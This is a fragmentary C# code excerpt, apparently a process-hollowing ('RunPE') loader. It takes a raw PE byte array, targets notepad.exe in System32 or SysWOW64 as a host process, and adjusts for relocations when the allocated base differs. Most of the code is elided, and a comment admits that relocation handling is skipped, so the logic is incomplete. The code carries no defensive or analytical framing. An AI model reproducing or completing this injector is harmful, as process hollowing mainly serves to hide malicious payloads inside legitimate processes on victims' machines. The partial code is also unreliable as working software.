...
public static class H
{
    ...
    public static int Run(byte[] pe)
    {
        ...
        // Determine architecture from PE
        ...
        string targetExe = is64 ? @"C:\Windows\System32\notepad.exe" : @"C:\Windows\SysWOW64\notepad.exe";
        ...
        if (newBase == IntPtr.Zero) return 2;
        ...
        // Apply relocations if base differs
        long delta = (long)newBase.ToInt64() - (long)prefBase;
        if (delta != 0) {
            ApplyRelocs(pe, pi.hProcess, newBase, delta, is64);
        }
    ...
    static void ApplyRelocs(byte[] pe, IntPtr hProcess, IntPtr baseAddr, long delta, bool is64) {
        // Minimal relocation handling: we'll just adjust the ImageBase field in the headers if needed,
        // because WriteProcessMemory already copied the original base. If the relocation directory
        // is present, we'd process it here. For now, we rely on the EXE being position-independent
        // (many modern EXEs have a relocation directory, but we skip it for brevity).
